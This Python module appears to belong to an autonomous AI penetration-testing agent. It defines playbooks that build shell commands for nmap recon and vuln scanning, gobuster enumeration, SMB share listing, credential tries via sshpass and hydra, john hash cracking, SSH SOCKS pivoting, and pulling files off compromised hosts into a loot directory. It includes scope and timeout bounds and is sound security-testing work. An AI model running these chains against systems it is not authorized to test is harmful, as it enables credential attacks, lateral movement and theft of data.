"""Bounded macro-playbooks — commodity pentest chains as one call each.

Incalmo showed small models succeed more often on high-level actions;
these are ours: each playbook builds ONE shell line (scope-checked by
the same guards as exec_in_kali), runs it on a dedicated 'pb' tmux
window with `timeout` baked in, then parses the pane output into
coverage-ledger rows + shared notes automatically.

A playbook spec carries:
  needs   — binaries that must exist in KALI_TOOLS (probed at deploy)
  build() — args → single POSIX line; embeds its own `timeout` bound
  parse() — pane output → {"coverage": [...], "notes": [...]}
"""
from __future__ import annotations

import re
import shlex
from dataclasses import dataclass

PLAYBOOK_WINDOW = "pb"          # dedicated tmux window — off the main pane
_LOOT_DIR = "~/loot"


@dataclass
class Playbook:
    name: str
    desc: str
    required: list[str]           # arg names that must be non-empty
    optional: list[str]           # accepted but omittable
    needs: list[str]              # KALI_TOOLS binaries required
    build: object                 # args -> command line
    parse: object                 # output -> {"coverage": [...], "notes": [...]}

    def args_hint(self) -> str:
        need = ", ".join(self.required)
        opt = f" (optional: {', '.join(self.optional)})" if self.optional else ""
        return f"args: {need}{opt}"


_IP_RE = re.compile(r"\b\d{1,3}(?:\.\d{1,3}){3}\b")
_NMAP_OPEN = re.compile(r"^(\d+)/(?:tcp|udp)\s+open\s+(\S+)", re.MULTILINE)
_GOBUSTER_HIT = re.compile(r"^(/\S*)\s+\(Status:\s*(\d+)\)", re.MULTILINE)
_SMB_SHARE = re.compile(r"^\s*(\S+)\s+Disk\s", re.MULTILINE)
_VULN_LINE = re.compile(r"(VULNERABLE|CVE-\d{4}-\d+|State:\s*\S+)")


def _host_ports(out: str) -> list[tuple[str, int, str]]:
    """(port, service) tuples from nmap-style output — playbook targets
    carry exactly one IP, so 'port open svc' rows map onto it."""
    ip = next(iter(_IP_RE.findall(out)), "")
    return [(ip, int(p), s) for p, s in _NMAP_OPEN.findall(out)]


def _q(v: str) -> str:
    return shlex.quote(str(v))


# ---------- build() helpers ----------

def _b_full_recon(a):
    t = a["target"]
    return (f"timeout 280 nmap -Pn -sV -sC --top-ports 300 "
            f"-oA /tmp/recon-{_safe(t)} {_q(t)}")


def _b_web_enum(a):
    t, p = a["target"], int(a.get("port") or 80)
    sch = "https" if str(a.get("scheme") or "") == "https" or p == 443 \
        else "http"
    base = f"{sch}://{t}:{p}"
    return (f"curl -sk --max-time 10 -o /tmp/web-root.html -w "
            f"'ROOT %{{http_code}} %{{size_download}}b\\n' {_q(base + '/')} "
            f"&& timeout 200 gobuster dir -u {_q(base)} "
            f"-w /usr/share/wordlists/dirb/common.txt -t 24 -q "
            f"-o /tmp/web-dirs.txt; tail -30 /tmp/web-dirs.txt 2>/dev/null")


def _b_smb_enum(a):
    t = a["target"]
    return (f"timeout 60 smbclient -L //{_q(t)} -N 2>&1 | head -30; "
            f"timeout 120 nmap -p445 --script smb-enum-shares,"
            f"smb-os-discovery {_q(t)} 2>/dev/null | tail -40")


def _b_cred_try(a):
    t = a["target"]
    user, pw = a["user"], a["pass"]
    svc = str(a.get("service") or "ssh").lower()
    if svc == "ssh":
        return (f"timeout 20 sshpass -p {_q(pw)} ssh "
                f"-o StrictHostKeyChecking=no -o ConnectTimeout=6 "
                f"{_q(user)}@{_q(t)} 'id && hostname' 2>&1 | head -8")
    if svc == "smb":
        return (f"timeout 30 smbclient //{_q(t)}/IPC$ "
                f"-U {_q(user + '%' + pw)} -c 'ls' 2>&1 | head -12")
    if svc == "ftp":
        return (f"timeout 20 curl -s --max-time 10 "
                f"ftp://{_q(user)}:{_q(pw)}@{_q(t)}/ 2>&1 | head -12")
    return (f"timeout 20 hydra -l {_q(user)} -p {_q(pw)} "
            f"{_q(t)} {_q(svc)} 2>&1 | tail -12")


def _b_hash_crack(a):
    h = a["hash"]
    return (f"hashid {_q(h)} 2>/dev/null | head -6; "
            f"echo {_q(h)} > /tmp/h.txt && "
            f"timeout 90 john --wordlist=/usr/share/wordlists/rockyou.txt "
            f"/tmp/h.txt 2>/dev/null; john --show /tmp/h.txt 2>/dev/null "
            f"| head -6")


def _b_vuln_triage(a):
    t = a["target"]
    p = f"-p{int(a['port'])}" if a.get("port") else "--top-ports 200"
    return f"timeout 240 nmap -sV --script vuln {p} {_q(t)} 2>&1 | tail -50"


def _b_pivot_setup(a):
    via, t = a["via"], a["target"]
    user, pw = a["user"], a["pass"]
    # the SOCKS tunnel must outlive this command — a 15s timeout would
    # kill it before the scan (or any later proxychains use) finishes;
    # 900s keeps it bounded without stranding the pivot
    return (f"pkill -f 'ssh -N -D 1080' 2>/dev/null; "
            f"timeout 900 sshpass -p {_q(pw)} ssh -o StrictHostKeyChecking=no "
            f"-N -D 1080 {_q(user)}@{_q(via)} & sleep 2; "
            f"timeout 60 proxychains -q nmap -Pn -sT --top-ports 50 "
            f"{_q(t)} 2>&1 | tail -25")


_PATH_OK = re.compile(r"^[A-Za-z0-9_./~\\: -]{1,160}$")


def _b_loot_pull(a):
    t, path = a["target"], a["path"]
    user, pw = a["user"], a["pass"]
    # the smb branch embeds `path` inside a single-quoted -c arg — a
    # quote or metachar there escapes the quoting; path shapes stay
    # restricted to real remote paths for both branches
    if not _PATH_OK.fullmatch(str(path)) or "'" in str(path):
        raise ValueError("path must be a plain remote path "
                         "(no quotes/metachars)")
    proto = str(a.get("proto") or "ssh").lower()
    if proto == "smb":
        share = str(a.get("share") or "c$")
        if not re.fullmatch(r"[A-Za-z0-9_$-]{1,32}", share):
            raise ValueError("share must be a plain share name")
        return (f"mkdir -p {_LOOT_DIR} && timeout 60 smbclient "
                f"//{_q(t)}/{_q(share)} -U {_q(user + '%' + pw)} "
                f"-c 'get {path}' 2>&1 | head -10; "
                f"mv {_q(path.split('/')[-1].split(chr(92))[-1])} "
                f"{_LOOT_DIR}/ 2>/dev/null; "
                f"ls -la {_LOOT_DIR}/")
    return (f"mkdir -p {_LOOT_DIR} && timeout 60 sshpass -p {_q(pw)} scp "
            f"-o StrictHostKeyChecking=no {_q(user)}@{_q(t)}:{_q(path)} "
            f"{_LOOT_DIR}/ 2>&1 | head -8; ls -la {_LOOT_DIR}/")


def _safe(v: str) -> str:
    return re.sub(r"[^A-Za-z0-9_.-]", "_", str(v))[:40]


# ---------- parse() helpers ----------

def _p_nmap_ports(out, area):
    cov = [{"surface": f"{ip}:{p}", "area": area, "outcome": "testing",
            "evidence": f"{svc} open — deep-enum due"}
           for ip, p, svc in _host_ports(out)]
    note = (f"recon:{ip}" if (ip := next(iter(_IP_RE.findall(out)), ""))
            else "")
    notes = ([{"key": note, "text": f"{ip} services: "
               + ", ".join(f"{p}/{s}" for _i, p, s in _host_ports(out))[:180]}]
             if cov and note else [])
    return {"coverage": cov, "notes": notes}


def _p_web(out, _a=None):
    cov = [{"surface": f"web:{path}", "area": "web", "outcome": "testing",
            "evidence": f"HTTP {st} — content exists"}
           for path, st in _GOBUSTER_HIT.findall(out)
           if st in ("200", "301", "302", "401", "403")]
    root = re.search(r"ROOT (\d{3}) (\d+)b", out)
    if root:
        cov.insert(0, {"surface": "web:/", "area": "web",
                       "outcome": "testing",
                       "evidence": f"root {root.group(1)} "
                                   f"{root.group(2)}b"})
    return {"coverage": cov[:20],
            "notes": [{"key": "web-endpoints",
                       "text": "dirs: " + ", ".join(
                           p for p, _s in _GOBUSTER_HIT.findall(out))[:180]}]
            if cov else []}


def _p_smb(out, _a=None):
    ip = next(iter(_IP_RE.findall(out)), "?")
    shares = [s for s in _SMB_SHARE.findall(out)
              if s not in ("Disk", "---", "Sharename")]
    return {"coverage": [{"surface": f"{ip}:445", "area": "smb",
                          "outcome": "testing",
                          "evidence": f"shares: {', '.join(shares[:8])}"}]
                     if shares else [],
            "notes": [{"key": f"smb:{ip}",
                       "text": f"{ip} shares: {', '.join(shares[:10])}"}]
            if shares else []}


def _p_cred(out, _a=None):
    ok = bool(re.search(r"uid=\d+|Directory of|Volume Serial|^\s*d[rwx-]",
                        out, re.MULTILINE)) and not re.search(
        r"denied|failed|refused|invalid|timed out", out, re.IGNORECASE)
    return {"coverage": [],
            "notes": [{"key": "cred-result",
                       "text": ("cred_try SUCCEEDED — credential works"
                                if ok else
                                "cred_try failed — reject this pair")}]}


def _p_hash(out, _a=None):
    cracked = re.search(r"^\S+:(\S+)$", out.split("john --show")[-1],
                        re.MULTILINE)
    return {"coverage": [],
            "notes": [{"key": "hash-cracked",
                       "text": f"hash cracked: {cracked.group(1)[:80]}"}]
            if cracked else []}


def _p_vuln(out, _a=None):
    ip = next(iter(_IP_RE.findall(out)), "?")
    hits = _VULN_LINE.findall(out)
    return {"coverage": [{"surface": f"{ip}:vuln-scan", "area": "vuln",
                          "outcome": "open_gap",
                          "evidence": "; ".join(hits[:4])[:180]}]
            if hits else [],
            "notes": []}


def _p_pivot(out, _a=None):
    return _p_nmap_ports(out, "pivot")


def _p_loot(out, _a=None):
    pulled = re.findall(r"^-rw\S*\s+\S+\s+\S+\s+\S+\s+(\S+)$", out, re.MULTILINE)
    return {"coverage": [],
            "notes": [{"key": "loot-pulled",
                       "text": f"loot dir: {', '.join(pulled[:10])}"}]
            if pulled else []}


def _p_full_recon(out):
    return _p_nmap_ports(out, "recon")


PLAYBOOKS: list[Playbook] = [
    Playbook("full_recon",
             "nmap top-300 versions+scripts, output to /tmp/recon-<ip>*",
             ["target"], [], ["nmap"], _b_full_recon, _p_full_recon),
    Playbook("web_enum",
             "root fetch + gobuster dir over a web surface",
             ["target"], ["port", "scheme"], ["curl", "gobuster"],
             _b_web_enum, _p_web),
    Playbook("smb_enum",
             "anonymous share listing + smb-enum scripts",
             ["target"], [], ["smbclient", "nmap"], _b_smb_enum, _p_smb),
    Playbook("cred_try",
             "single credential against ONE service (ssh|smb|ftp|other→hydra)",
             ["target", "user", "pass"], ["service"], ["sshpass"],
             _b_cred_try, _p_cred),
    Playbook("hash_crack",
             "identify + bounded john crack (rockyou, 90s cap)",
             ["hash"], [], ["john"], _b_hash_crack, _p_hash),
    Playbook("vuln_triage",
             "nmap --script vuln on one host/port — candidate CVE surface",
             ["target"], ["port"], ["nmap"], _b_vuln_triage, _p_vuln),
    Playbook("pivot_setup",
             "ssh -D socks pivot through a held host + probe beyond it",
             ["via", "target", "user", "pass"], [],
             ["sshpass", "proxychains"], _b_pivot_setup, _p_pivot),
    Playbook("loot_pull",
             "pull a file off a held host into ~/loot (ssh scp or smb get)",
             ["target", "path", "user", "pass"], ["proto", "share"],
             ["sshpass"], _b_loot_pull, _p_loot),
]

_BY_NAME = {p.name: p for p in PLAYBOOKS}


def get(name: str) -> Playbook | None:
    return _BY_NAME.get((name or "").strip())


def names() -> str:
    return ", ".join(p.name for p in PLAYBOOKS)


def describe() -> str:
    """one line per playbook — for the tool description/error text"""
    return "; ".join(f"{p.name}({','.join(p.required)})" for p in PLAYBOOKS)
